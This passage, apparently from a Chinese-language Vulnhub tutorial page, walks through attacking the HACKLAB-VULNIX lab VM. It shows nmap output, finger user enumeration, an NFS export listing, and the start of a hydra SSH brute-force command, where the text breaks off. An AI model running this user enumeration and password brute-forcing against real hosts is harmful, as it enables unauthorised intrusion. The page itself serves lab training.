@@ -1,0 +1,252 @@
+<!doctype html><html><head><title>Vulnhub 48 HACKLAB-VULNIX</title><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><meta name=google-site-verification content><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name=viewport><meta content="telephone=no" name=format-detection><meta name=description content><meta name=renderer content="webkit"><meta name=theme-color content="#ffffff"><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","abcdefghzd")</script><script src=/js/toc.js></script>
+<link type=text/css rel=stylesheet href=/vendor/css/bootstrap.min.css><link rel=stylesheet href=/scss/dark-mode.scss integrity media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Material+Icons"><script>console.log("Hello from 'layouts/partials/extended_head.html'")</script></head><body><div id=app><div class=single-column-drawer-container id=drawer v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }"><div class=drawer-content><div class=drawer-menu><a class="a-block drawer-menu-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block drawer-menu-item false" href=/posts>Archive</a>
+<a class="a-block drawer-menu-item false" href=/categories>Categories</a>
+<a class="a-block drawer-menu-item false" href=/tags>Tags</a>
+<a class="a-block drawer-menu-item false" href=/index.xml>RSS Feed</a><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><ul><li><a href=#79 class=nav-79>79</a></li><li><a href=#2049 class=nav-2049>2049</a></li></ul></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><ul><li><a href=#hydra class=nav-hydra>hydra</a></li><li><a href=#authorized_keys class=nav-authorized_keys>authorized_keys</a></li></ul><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li><ul><li><a href=#%e6%80%9d%e8%b7%af%e4%b8%80 class=nav-思路一>思路一</a></li><li><a href=#%e6%80%9d%e8%b7%af%e4%ba%8c class=nav-思路二>思路二</a></li></ul></div></div></div></div></div><transition name=fade><div id=drawer-mask v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if=isDrawerOpen v-on:click=toggleDrawer></div></transition><nav id=navBar class="navbar sticky-top navbar-light single-column-nav-container"><div id=navBackground class=nav-background></div><div class="container container-narrow nav-content"><button id=nav_dropdown_btn class=nav-dropdown-toggle type=button v-on:click=toggleDrawer>
+<i class=material-icons>menu</i></button>
+<a id=navTitle class=navbar-brand href=https://www.vulnhub.cn>Vulnhub靶机教程</a>
+<button type=button class=nav-darkmode-toggle id=darkModeToggleButton2>
+<i class=material-icons id=darkModeToggleIcon2>dark_mode</i></button></div></nav><div class=single-column-header-container id=pageHead v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"><a href=https://www.vulnhub.cn><div class=single-column-header-title>Vulnhub靶机教程</div><div class=single-column-header-subtitle>Themed by Diary.</div></a></div><div id=content><div id=streamContainer class=stream-container><div class="post-list-container post-list-container-shadow"><div class=post><div class=post-head-wrapper-text-only><div class=post-title>Vulnhub 48 HACKLAB-VULNIX<div class=post-meta><time itemprop=datePublished>2012-09-10 00:00</time></div></div></div><div class=post-body-wrapper><div class=post-body v-pre><p>考点： ssh,nfs,hydra</p><p>靶机链接：<a href=https://www.vulnhub.com/entry/hacklab-vulnix,48/>https://www.vulnhub.com/entry/hacklab-vulnix,48/</a></p><h2 id=环境配置>环境配置</h2><table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>Kali Linux</td><td>192.168.88.135</td></tr><tr><td>HACKLAB: VULNIX</td><td>192.168.88.146</td></tr></tbody></table><h2 id=初步打点>初步打点</h2><h3 id=端口扫描>端口扫描</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">92
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ <span style=color:#658b00>export</span> <span style=color:#00688b>rip</span>=192.168.88.146
+</span></span><span style=display:flex><span>$ sudo nmap -v -A <span style=color:#00688b>$rip</span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE    VERSION
+</span></span><span style=display:flex><span>22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>1024</span> 10cd9ea0e4e030243ebd675f754a33bf (DSA)
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>2048</span> bcf924072fcb76800d27a648520a243a (RSA)
+</span></span><span style=display:flex><span>|_  <span style=color:#b452cd>256</span> 4dbb4ac118e8dad1826f58529cee345f (ECDSA)
+</span></span><span style=display:flex><span>25/tcp   open  smtp       Postfix smtpd
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=vulnix
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=vulnix
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>2048</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2012-09-02T17:40:12
+</span></span><span style=display:flex><span>| Not valid after:  2022-08-31T17:40:12
+</span></span><span style=display:flex><span>| MD5:   58e3f1acfef6b6d1744c836fba244f0a
+</span></span><span style=display:flex><span>|_SHA-1: 712f69ba8c5432e5711c898b55ab0a8344a0420b
+</span></span><span style=display:flex><span>|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+</span></span><span style=display:flex><span>79/tcp   open  finger     Linux fingerd
+</span></span><span style=display:flex><span>|_finger: No one logged on.<span style=color:#cd5555>\x</span>0D
+</span></span><span style=display:flex><span>110/tcp  open  pop3?
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>2048</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2012-09-02T17:40:22
+</span></span><span style=display:flex><span>| Not valid after:  2022-09-02T17:40:22
+</span></span><span style=display:flex><span>| MD5:   2b3f3e28c85de10c7b7a2435c5e784fc
+</span></span><span style=display:flex><span>|_SHA-1: 4a49a40701f137c881a34519981b1eee6856348e
+</span></span><span style=display:flex><span>111/tcp  open  rpcbind    2-4 (RPC <span style=color:#228b22>#100000)</span>
+</span></span><span style=display:flex><span>| rpcinfo: 
+</span></span><span style=display:flex><span>|   program version    port/proto  service
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100000</span>  3,4          111/tcp6  rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100000</span>  3,4          111/udp6  rpcbind
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100003</span>  2,3,4       2049/tcp   nfs
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100003</span>  2,3,4       2049/tcp6  nfs
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100003</span>  2,3,4       2049/udp   nfs
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100003</span>  2,3,4       2049/udp6  nfs
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100005</span>  1,2,3      33986/udp6  mountd
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100005</span>  1,2,3      40113/tcp   mountd
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100005</span>  1,2,3      47217/tcp6  mountd
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100005</span>  1,2,3      48374/udp   mountd
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100021</span>  1,3,4      33046/udp   nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100021</span>  1,3,4      34071/tcp6  nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100021</span>  1,3,4      46066/tcp   nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100021</span>  1,3,4      58531/udp6  nlockmgr
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100024</span>  <span style=color:#b452cd>1</span>          35400/udp6  status
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100024</span>  <span style=color:#b452cd>1</span>          39412/tcp   status
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100024</span>  <span style=color:#b452cd>1</span>          46645/udp   status
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100024</span>  <span style=color:#b452cd>1</span>          58409/tcp6  status
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100227</span>  2,3         2049/tcp   nfs_acl
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100227</span>  2,3         2049/tcp6  nfs_acl
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>100227</span>  2,3         2049/udp   nfs_acl
+</span></span><span style=display:flex><span>|_  <span style=color:#b452cd>100227</span>  2,3         2049/udp6  nfs_acl
+</span></span><span style=display:flex><span>143/tcp  open  imap       Dovecot imapd
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>2048</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2012-09-02T17:40:22
+</span></span><span style=display:flex><span>| Not valid after:  2022-09-02T17:40:22
+</span></span><span style=display:flex><span>| MD5:   2b3f3e28c85de10c7b7a2435c5e784fc
+</span></span><span style=display:flex><span>|_SHA-1: 4a49a40701f137c881a34519981b1eee6856348e
+</span></span><span style=display:flex><span>512/tcp  open  <span style=color:#658b00>exec</span>       netkit-rsh rexecd
+</span></span><span style=display:flex><span>513/tcp  open  login
+</span></span><span style=display:flex><span>514/tcp  open  tcpwrapped
+</span></span><span style=display:flex><span>993/tcp  open  ssl/imap   Dovecot imapd
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>2048</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2012-09-02T17:40:22
+</span></span><span style=display:flex><span>| Not valid after:  2022-09-02T17:40:22
+</span></span><span style=display:flex><span>| MD5:   2b3f3e28c85de10c7b7a2435c5e784fc
+</span></span><span style=display:flex><span>|_SHA-1: 4a49a40701f137c881a34519981b1eee6856348e
+</span></span><span style=display:flex><span>995/tcp  open  ssl/pop3s?
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Issuer: <span style=color:#00688b>commonName</span>=vulnix/organizationName=Dovecot mail server
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#b452cd>2048</span>
+</span></span><span style=display:flex><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2012-09-02T17:40:22
+</span></span><span style=display:flex><span>| Not valid after:  2022-09-02T17:40:22
+</span></span><span style=display:flex><span>| MD5:   2b3f3e28c85de10c7b7a2435c5e784fc
+</span></span><span style=display:flex><span>|_SHA-1: 4a49a40701f137c881a34519981b1eee6856348e
+</span></span><span style=display:flex><span>2049/tcp open  nfs_acl    2-3 (RPC <span style=color:#228b22>#100227)</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=79>79</h4><p>参考<a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger>https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger</a></p><pre tabindex=0><code>$ wget https://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
+$ tar xvf finger-user-enum-1.0.tar.gz
+$ tar xvf finger-user-enum-1.0.tar.gz
+</code></pre><p>使用finger-user-enum.pl穷举用户</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ perl finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.88.146
+</span></span><span style=display:flex><span>Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+</span></span><span style=display:flex><span>admin@192.168.88.146: finger: admin: no such user...
+</span></span><span style=display:flex><span>info@192.168.88.146: finger: info: no such user...
+</span></span><span style=display:flex><span>adm@192.168.88.146: finger: adm: no such user...
+</span></span><span style=display:flex><span>root@192.168.88.146: Login: root                                Name: root..Directory: /root                            Shell: /bin/bash..Never logged in...No mail...No Plan...
+</span></span><span style=display:flex><span>administrator@192.168.88.146: finger: administrator: no such user...
+</span></span><span style=display:flex><span>user@192.168.88.146: Login: user                                Name: user..Directory: /home/user                       Shell: /bin/bash..Never logged in...No mail...No Plan.....Login: dovenull                        Name: Dovecot login user..Directory: /nonexistent               Shell: /bin/false..Never logged in...No mail...No Plan...
+</span></span><span style=display:flex><span>azureuser@192.168.88.146: finger: azureuser: no such user...
+</span></span><span style=display:flex><span><span style=color:#b452cd>7</span> results.
+</span></span></code></pre></td></tr></table></div></div><p>测试靶机名<code>vulnix</code>作为用户名</p><pre tabindex=0><code>$ finger vulnix@192.168.88.146
+Login: vulnix                           Name: 
+Directory: /home/vulnix                 Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+</code></pre><p>找到三个用户 <code>root</code>,<code>user</code> ,<code>vulnix</code></p><p><img src=https://www.vulnhub.cn/walkthrough/48/1.webp alt></p><h4 id=2049>2049</h4><pre tabindex=0><code>$ showmount -e  192.168.88.146
+Export list for 192.168.88.146:
+/home/vulnix *
+</code></pre><h2 id=获得权限>获得权限</h2><h3 id=hydra>hydra</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.88.146 ssh
